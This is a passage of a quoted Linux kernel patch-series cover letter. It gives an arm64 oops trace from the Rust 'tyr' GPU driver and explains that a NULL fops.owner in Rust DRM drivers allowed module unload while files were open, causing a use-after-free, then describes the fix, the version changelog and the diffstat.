+>    [158827.868918] Mem abort info:
+>    [158827.869177]   ESR = 0x0000000086000004
+>    [158827.869519]   EC = 0x21: IABT (current EL), IL = 32 bits
+>    [158827.870000]   SET = 0, FnV = 0
+>    [158827.870281]   EA = 0, S1PTW = 0
+>    [158827.870571]   FSC = 0x04: level 0 translation fault
+>    [158827.871043] user pgtable: 4k pages, 48-bit VAs, pgdp=0000000108dec000
+>    [158827.871623] [0000000000000000] pgd=0000000000000000, p4d=0000000000000000
+>    [158827.872242] Internal error: Oops: 0000000086000004 [#1]  SMP
+>    [158827.872246] Modules linked in: tyr sunrpc snd_soc_simple_card rk805_pwrkey snd_soc_simple_card_utils rtw88_8822bu display_connector rtw88_usb rtw88_8822b snd_soc_rockchip_i2s_tdm snd_soc_hdmi_codec
+>    rtw88_core]
+>    [158827.872337] CPU: 4 UID: 1000 PID: 11276 Comm: gnome-s:disk$0 Tainted: G                 N  7.1.0-rc1+ #331 PREEMPT
+>    [158827.880534] Tainted: [N]=TEST
+>    [158827.880535] Hardware name: FriendlyElec NanoPi R6C/NanoPi R6C, BIOS v1.1 04/09/2025
+>    [158827.880538] pstate: 60400009 (nZCv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
+>    [158827.880542] pc : 0x0
+>    [158827.880547] lr : _RNvNtCs257m05FHVbX_3tyr2vm8pt_unmap+0x8c/0x12c [tyr]
+>    [158827.880578] sp : ffff800083c236b0
+>    [158827.880579] x29: ffff800083c236d0 x28: ffff00013f8a0000 x27: 0000000000000000
+>    [158827.880585] x26: 000000000000007c x25: ffff000108e6ed80 x24: 0000000000401000
+>    [158827.880590] x23: 0000000000000000 x22: 0000000040000000 x21: 0000000000001000
+>    [158827.880595] x20: ffff00010f778138 x19: 0000000000400000 x18: 00000000ffffffff
+>    [158827.880600] x17: 000000040044ffff x16: 045000f2b5503510 x15: 0720072007200720
+>    [158827.880606] x14: 0720072007200720 x13: 0000000000401000 x12: 0000000000400000
+>    [158827.880611] x11: ffff800083c239d0 x10: ffff000141e4fd88 x9 : 0000000000000000
+>    [158827.880615] x8 : 0000000000000000 x7 : 0000000000000000 x6 : 0000000000400000
+>    [158827.880620] x5 : ffff00013f8a0000 x4 : 0000000000000000 x3 : 0000000000000001
+>    [158827.880625] x2 : 0000000000001000 x1 : 0000000000400000 x0 : ffff00010f778138
+>    [158827.880630] Call trace:
+>    [158827.880632]  0x0 (P)
+>    [158827.880635]  _RNvXs6_NtCs257m05FHVbX_3tyr2vmNtB5_9GpuVmDataNtNtNtCsgmSOfgXi5CZ_6kernel3drm5gpuvm11DriverGpuVm13sm_step_unmap+0x3c/0x120 [tyr]
+>    [158827.891166]  _RNvMs4_NtNtNtCsgmSOfgXi5CZ_6kernel3drm5gpuvm6sm_opsINtB7_5GpuVmNtNtCs257m05FHVbX_3tyr2vm9GpuVmDataE13sm_step_unmapB13_+0x18/0x34 [tyr]
+>    [158827.891187]  op_unmap_cb+0x78/0xb0
+>    [158827.891196]  __drm_gpuvm_sm_unmap+0x18c/0x1b4
+>    [158827.891204]  drm_gpuvm_sm_unmap+0x38/0x4c
+>    [158827.891209]  _RNvMs5_NtCs257m05FHVbX_3tyr2vmNtB5_2Vm7exec_op+0x1cc/0x254 [tyr]
+>    [158827.894085]  _RNvMs5_NtCs257m05FHVbX_3tyr2vmNtB5_2Vm11unmap_range+0x124/0x188 [tyr]
+>    [158827.894105]  _RINvNtCs5hGKnPbRUFW_4core3ptr13drop_in_placeNtNtCs257m05FHVbX_3tyr3gem8KernelBoEBK_+0x44/0xd8 [tyr]
+>    [158827.894125]  _RINvNtCs5hGKnPbRUFW_4core3ptr13drop_in_placeINtNtNtCsgmSOfgXi5CZ_6kernel5alloc4kvec3VecNtNtCs257m05FHVbX_3tyr2fw7SectionNtNtBL_9allocator7KmallocEEB1r_+0x3c/0x100 [tyr]
+>    [158827.894147]  _RINvNtCs5hGKnPbRUFW_4core3ptr13drop_in_placeINtNtNtCsgmSOfgXi5CZ_6kernel4sync3arc3ArcNtNtCs257m05FHVbX_3tyr2fw8FirmwareEEB1p_+0x94/0x190 [tyr]
+>    [158827.894167]  _RNvMs4_NtNtCsgmSOfgXi5CZ_6kernel3drm6deviceINtB5_6DeviceNtNtCs257m05FHVbX_3tyr6driver12TyrDrmDriverE7releaseBW_+0x30/0x98 [tyr]
+>    [158827.899550]  drm_dev_put.part.0+0x88/0xc0
+>    [158827.899557]  drm_minor_release+0x18/0x28
+>    [158827.899562]  drm_release+0x144/0x170
+>    [158827.899567]  __fput+0xe4/0x30c
+>    [158827.899573]  ____fput+0x14/0x20
+>    [158827.899579]  task_work_run+0x7c/0xe8
+>    [158827.899586]  do_exit+0x2a8/0xac4
+>    [158827.899590]  do_group_exit+0x34/0x90
+>    [158827.899594]  get_signal+0xaac/0xabc
+>    [158827.899599]  arch_do_signal_or_restart+0x90/0x3e8
+>    [158827.899606]  exit_to_user_mode_loop+0x140/0x1d0
+>    [158827.899613]  el0_svc+0x2f4/0x2f8
+>    [158827.899620]  el0t_64_sync_handler+0xa0/0xe4
+>    [158827.899627]  el0t_64_sync+0x198/0x19c
+>    [158827.899632] ---[ end trace 0000000000000000 ]---
+> ```
+>
+> The root cause: `fops.owner` was `NULL` in Rust DRM drivers, so the kernel
+> never blocked module unloading while file descriptors were open. This leads to
+> use-after-free when drm_release (or other fops) is called on freed module code.
+>
+> The series moves `THIS_MODULE` into the `ModuleMetadata` as a const, threads it
+> through `#[vtable]` to set `fops.owner` in DRM/miscdevice, and updates configfs
+> and rnull to use `this_module::<LocalModule>()`.
+>
+> Assisted-by: opencode:glm-5.2
+> Signed-off-by: Alvin Sun <alvin.sun@linux.dev>
+> ---
+> Changes in v9:
+> - Rename the binder commit prefix from `rust: binder:` to `rust_binder:`
+>    to match the in-tree module name.
+> - Link to v8: https://lore.kernel.org/r/20260713-fix-fops-owner-v8-0-2495cfa82d47@linux.dev
+>
+> Changes in v8:
+> - Remove unused `crate::LocalModule` import in rnull configfs.
+> - Link to v7: https://lore.kernel.org/r/20260627-fix-fops-owner-v7-0-33cd3990edf0@linux.dev
+>
+> Changes in v7:
+> - Use `crate::LocalModule` in `configfs_attrs!` and silence `clippy::crate_in_macro_def`, per Gary's review.
+> - Link to v6: https://lore.kernel.org/r/20260624-fix-fops-owner-v6-0-5295e333cb3e@linux.dev
+>
+> Changes in v6:
+> - Update MAINTAINERS to cover the new `rust/kernel/module.rs`.
+> - Link to v5: https://lore.kernel.org/r/20260624-fix-fops-owner-v5-0-aa1cba242f05@linux.dev
+>
+> Changes in v5:
+> - Add `#[inline]` to the `this_module()` helper.
+> - Fix configfs doc comment to reference `crate::LocalModule` instead of
+>    bare `LocalModule`.
+> - Link to v4: https://lore.kernel.org/r/20260623-fix-fops-owner-v4-0-0daf5f077d5c@linux.dev
+>
+> Changes in v4:
+> - Move module-related types into a new `rust/kernel/module.rs`.
+> - Migrate binder from the `module!`-generated `THIS_MODULE` static to
+>    `this_module::<LocalModule>()`.
+> - Reorganise the series so that every commit builds independently, and
+>    drop the legacy `THIS_MODULE` static once all users are migrated.
+> - Link to v3: https://lore.kernel.org/r/20260622-fix-fops-owner-v3-0-49d45cb37032@linux.dev
+>
+> Changes in v3:
+> - Renamed vtable associated type `ThisModule` to `OwnerModule`
+> - Added `this_module()` helper for ergonomic `THIS_MODULE` access
+> - Refined vtable macro implementation: one-liner detection and single `defined_items` set
+> - Reordered commits to place doctest fallback before vtable auto-insert
+> - Link to v2: https://lore.kernel.org/r/20260521-fix-fops-owner-v2-0-fd99079c5a04@linux.dev
+>
+> Changes in v2:
+> - Merged old `static THIS_MODULE` and v1's `MODULE_PTR` into a single
+>    `ModuleMetadata::THIS_MODULE` const
+> - `#[vtable]` macro now auto-inserts `type ThisModule`, removing all per-driver
+>    manual patches from v1
+> - Added configfs & rnull usage site updates and doctest `LocalModule` fallback
+> - Link to v1: https://lore.kernel.org/r/20260519-fix-fops-owner-v1-0-2ded9830da14@linux.dev
+>
+> ---
+> Alvin Sun (10):
+>        rust: module: move module types into `module.rs`
+>        rust: module: add `THIS_MODULE` const to `ModuleMetadata` trait
+>        rust: doctest: add LocalModule fallback for #[vtable] ThisModule
+>        rust: macros: auto-insert OwnerModule in #[vtable]
+>        rust: drm: set fops.owner from driver module pointer
+>        rust: miscdevice: set fops.owner from driver module pointer
+>        rust: configfs: use `LocalModule` for `THIS_MODULE`
+>        rust_binder: use `LocalModule` for `THIS_MODULE`
+>        rust: macros: remove `THIS_MODULE` static from `module!`
+>        rust: module: update MAINTAINERS to cover module.rs
+>
+>   MAINTAINERS                                |  2 +-
+>   drivers/android/binder/rust_binder_main.rs |  3 +-
+>   drivers/block/rnull/configfs.rs            |  5 +-
+>   rust/kernel/auxiliary.rs                   |  2 +-
+>   rust/kernel/configfs.rs                    |  9 ++--
+>   rust/kernel/drm/device.rs                  |  3 +-
+>   rust/kernel/drm/gem/mod.rs                 |  4 +-
+>   rust/kernel/i2c.rs                         |  2 +-
+>   rust/kernel/lib.rs                         | 75 +++-------------------------
+>   rust/kernel/miscdevice.rs                  |  4 +-
+>   rust/kernel/module.rs                      | 80 ++++++++++++++++++++++++++++++
+>   rust/kernel/net/phy.rs                     |  6 ++-
+>   rust/kernel/pci.rs                         |  2 +-
+>   rust/kernel/platform.rs                    |  2 +-
+>   rust/kernel/usb.rs                         |  2 +-
+>   rust/macros/lib.rs                         |  6 +++
+>   rust/macros/module.rs                      | 34 ++++++-------
+>   rust/macros/vtable.rs                      | 41 +++++++++++++--
+>   scripts/rustdoc_test_gen.rs                | 16 ++++++
+>   19 files changed, 189 insertions(+), 109 deletions(-)
+> ---
+> base-commit: b7e5ac83cb16f7ffd11dc23736f84276602100ed
+> change-id: 20260519-fix-fops-owner-e3a77bb27c6c
+> prerequisite-change-id: 20260519-miscdev-use-format-9ab7e83b1c11:v3
+> prerequisite-patch-id: 405b334ff0d48ad350014f05a2321bdbaa025400
+> prerequisite-patch-id: 604b631c81d5423f4ebb2e12ba2d22e9ce371bfc
+> prerequisite-patch-id: cb550d94cefe01920e0d3ced2b2bcbecd76f3907
+> prerequisite-patch-id: 3bc830839742591460cb86d9472c04f4686dc600
+> prerequisite-patch-id: 571058244bc8c7088638d2e3225713011246c7e9
+> prerequisite-patch-id: 347c5a3c6dbef9832bfce8419fc23e6e08ba477f
+> prerequisite-patch-id: 3e202d988b56b88446f7535e90d3f00cf5f15701
+>
+> Best regards,
